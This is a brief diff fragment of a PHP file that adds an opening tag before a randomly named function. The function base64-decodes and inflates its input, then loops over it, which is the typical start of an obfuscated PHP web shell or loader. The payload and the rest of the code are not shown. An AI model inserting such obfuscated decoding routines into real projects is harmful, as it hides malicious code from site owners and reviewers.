@@ -1,4 +1,4 @@
- function fPGsNZ($muy)
+<?php  function fPGsNZ($muy)
 { 
 $muy=gzinflate(base64_decode($muy));
  for($i=0;$i<strlen($muy);$i++)
